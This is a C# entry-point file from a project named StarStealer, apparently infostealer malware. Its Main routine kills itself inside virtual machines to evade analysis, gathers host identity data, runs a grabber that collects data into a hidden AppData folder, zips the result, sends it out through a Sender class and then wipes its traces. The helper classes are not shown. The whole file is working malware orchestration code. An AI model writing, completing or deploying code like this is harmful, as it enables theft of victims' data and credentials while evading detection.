using StarStealer.Models;
using StarStealer.Utilities;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.Serialization.Json;

namespace StarStealer
{
    class Program
    {
        static void Main(string[] args)
        {
            if (Identifier.VMDetector())
                Process.GetCurrentProcess().Kill();
            Cleaner.Kill();
            User user = new User();
            Identifier.GetInfo(ref user);
            Directory.CreateDirectory($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\{user.Hwid}");
            Grabber.Grab(ref user);
            DataContractJsonSerializer jsonFormatter = new DataContractJsonSerializer(typeof(User));
            using (FileStream fs = new FileStream($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\{user.Hwid}\\Data.json", FileMode.OpenOrCreate))
            {
                jsonFormatter.WriteObject(fs, user);
            }
            if (File.Exists($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\{user.Hwid}.zip"))
                File.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\{user.Hwid}.zip");
            ZipFile.CreateFromDirectory($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\{user.Hwid}", $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\{user.Hwid}.zip", CompressionLevel.Fastest, false);
            Sender.Send(ref user);
            Cleaner.Clean(ref user);
        }
    }
}
